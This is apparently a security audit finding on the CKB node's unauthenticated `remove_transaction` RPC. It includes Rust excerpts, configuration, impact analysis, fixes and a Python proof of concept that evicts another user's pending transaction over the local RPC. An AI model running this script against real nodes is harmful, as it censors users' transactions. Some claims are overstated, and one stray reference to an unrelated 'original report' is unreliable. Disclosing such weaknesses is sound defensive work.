### Title
Unauthenticated `remove_transaction` RPC Allows Any Caller to Evict Another User's Pending Transaction from the Mempool - (File: `rpc/src/module/pool.rs`)

---

### Summary

The `remove_transaction` RPC endpoint in the `Pool` module accepts a transaction hash and unconditionally removes the matching transaction (and all its descendants) from the mempool. There is no check that the caller is the original submitter of the transaction or has any authorization over it. Any RPC caller who can reach the endpoint can silently evict any other user's pending transaction.

---

### Finding Description

`PoolRpcImpl::remove_transaction` at `rpc/src/module/pool.rs:662–669` passes the caller-supplied `tx_hash` directly to `tx_pool.remove_local_tx(tx_hash.into())` with zero identity or ownership verification:

```rust
// rpc/src/module/pool.rs:662-669
fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
    let tx_pool = self.shared.tx_pool_controller();

    tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
        error!("Send remove_tx request error {}", e);
        RPCError::ckb_internal_error(e)
    })
}
```

The underlying `TxPoolService::remove_tx` at `tx-pool/src/process.rs:440–456` then sweeps the verify queue, orphan pool, and the main pool for the given hash and removes the entry unconditionally:

```rust
// tx-pool/src/process.rs:440-456
pub(crate) async fn remove_tx(&self, tx_hash: Byte32) -> bool {
    let id = ProposalShortId::from_tx_hash(&tx_hash);
    { let mut queue = self.verify_queue.write().await;
      if queue.remove_tx(&id).is_some() { return true; } }
    { let mut orphan = self.orphan.write().await;
      if orphan.remove_orphan_tx(&id).is_some() { return true; } }
    let mut tx_pool = self.tx_pool.write().await;
    tx_pool.remove_tx(&id)
}
```

No field in either function records or checks who submitted the transaction. The `Pool` module is enabled by default (`resource/ckb.toml:190`) and the RPC server binds to `127.0.0.1:8114` by default (`resource/ckb.toml:182`). The RPC documentation explicitly warns that exposing the port to arbitrary machines is dangerous, yet no in-process authorization layer exists even for the localhost case.

The full list of pending transaction hashes is publicly readable via `get_raw_tx_pool` (also in the `Pool` module, no auth), giving an attacker a ready-made target list.

---

### Impact Explanation

**Transaction censorship / griefing without consent of the submitter.**

1. An attacker calls `get_raw_tx_pool` to enumerate all pending transaction hashes.
2. The attacker calls `remove_transaction(<victim_tx_hash>)` for any or all of them.
3. The victim's transaction is silently dropped from the mempool. The victim's cells are not immediately stolen (lock scripts still protect them on-chain), but:
   - **Time-sensitive operations fail**: DAO withdrawal phase-2 transactions have an epoch-based `since` lock. If the victim's withdrawal transaction is repeatedly evicted before it can be committed, the victim may miss the unlock window and forfeit accrued interest.
   - **Fee escalation**: The victim must resubmit, potentially at a higher fee rate, while the attacker pays nothing.
   - **Cascading eviction**: The RPC removes the target *and all descendant transactions*, so a single call can wipe an entire chain of dependent transactions built by the victim.
   - **Double-spend enablement (in weak-lock scenarios)**: If the victim's cells use a permissive lock (e.g., `always_success` in test/dev environments), an attacker can evict the victim's spend and immediately submit a competing transaction redirecting the output to themselves.

---

### Likelihood Explanation

**Medium.**

- The `Pool` module is enabled by default in every standard node configuration.
- The RPC binds to `127.0.0.1` by default, so exploitation requires local access or a misconfigured/publicly-exposed RPC port. Many node operators, exchanges, and dApp backends expose the RPC port to internal networks or, in some cases, the public internet (the documentation warns against this but does not enforce it).
- No authentication token, API key, or IP allowlist is enforced at the code level; the only protection is network-level firewall configuration.
- The attack requires no cryptographic material, no special privileges, and no knowledge beyond the target transaction hash (which is publicly visible in the mempool).

---

### Recommendation

1. **Require caller proof-of-ownership**: Before removing a transaction, verify that the caller can demonstrate control over at least one input cell of that transaction (e.g., by requiring a signed challenge). This mirrors the `msg.sender == _supplier` fix in the original report.
2. **Alternatively, restrict `remove_transaction` to a privileged/admin-only RPC module** (similar to `Debug` or `IntegrationTest`) that is disabled by default and requires explicit opt-in.
3. **At minimum, add an RPC-level authentication token** (bearer token, HTTP Basic Auth via reverse proxy enforcement) so that only the node operator can invoke mutating pool operations.
4. **Document the security boundary explicitly**: The current documentation warns about network exposure but does not call out that `remove_transaction` is an unauthenticated destructive operation.

---

### Proof of Concept

```python
import requests, json

NODE_RPC = "http://127.0.0.1:8114"

def rpc(method, params):
    return requests.post(NODE_RPC, json={
        "id": 1, "jsonrpc": "2.0",
        "method": method, "params": params
    }).json()

# Step 1: Alice submits her transaction (simulated – hash known from her submission)
alice_tx_hash = "0xa0ef4eb5f4ceeb08a4c8524d84c5da95dce2f608e0ca2ec8091191b0f330c6e3"

# Step 2: Bob (attacker) reads the mempool to confirm Alice's tx is pending
pool = rpc("get_raw_tx_pool", [True])
assert alice_tx_hash in pool["result"]["pending"], "Alice's tx not in pool"

# Step 3: Bob removes Alice's transaction with no authorization
result = rpc("remove_transaction", [alice_tx_hash])
print("Removed:", result["result"])   # → true

# Step 4: Alice's tx is gone; her cells are unlocked for a competing spend
pool_after = rpc("get_raw_tx_pool", [True])
assert alice_tx_hash not in pool_after["result"].get("pending", {}), \
    "Alice's tx should be evicted"
print("Alice's transaction silently evicted by Bob.")
```

**Root cause path**:
`POST /` (JSON-RPC) → `PoolRpcImpl::remove_transaction` (`rpc/src/module/pool.rs:662`) → `TxPoolController::remove_local_tx` (`tx-pool/src/service.rs:273`) → `TxPoolService::remove_tx` (`tx-pool/src/process.rs:440`) — no authorization check at any layer. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** rpc/src/module/pool.rs (L254-255)
```rust
    #[rpc(name = "remove_transaction")]
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool>;
```

**File:** rpc/src/module/pool.rs (L662-669)
```rust
    fn remove_transaction(&self, tx_hash: H256) -> Result<bool> {
        let tx_pool = self.shared.tx_pool_controller();

        tx_pool.remove_local_tx(tx_hash.into()).map_err(|e| {
            error!("Send remove_tx request error {}", e);
            RPCError::ckb_internal_error(e)
        })
    }
```

**File:** tx-pool/src/process.rs (L440-456)
```rust
    pub(crate) async fn remove_tx(&self, tx_hash: Byte32) -> bool {
        let id = ProposalShortId::from_tx_hash(&tx_hash);
        {
            let mut queue = self.verify_queue.write().await;
            if queue.remove_tx(&id).is_some() {
                return true;
            }
        }
        {
            let mut orphan = self.orphan.write().await;
            if orphan.remove_orphan_tx(&id).is_some() {
                return true;
            }
        }
        let mut tx_pool = self.tx_pool.write().await;
        tx_pool.remove_tx(&id)
    }
```

**File:** tx-pool/src/service.rs (L272-275)
```rust
    /// Remove tx from tx-pool
    pub fn remove_local_tx(&self, tx_hash: Byte32) -> Result<bool, AnyError> {
        send_message!(self, RemoveLocalTx, tx_hash)
    }
```

**File:** resource/ckb.toml (L177-193)
```text
[rpc]
# By default RPC only binds to localhost, thus it only allows accessing from the same machine.
#
# Allowing arbitrary machines to access the JSON-RPC port is dangerous and strongly discouraged.
# Please strictly limit the access to only trusted machines.
listen_address = "127.0.0.1:8114" # {{
# _ => listen_address = "127.0.0.1:{rpc_port}"
# }}

# Default is 10MiB = 10 * 1024 * 1024
max_request_body_size = 10485760

# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```
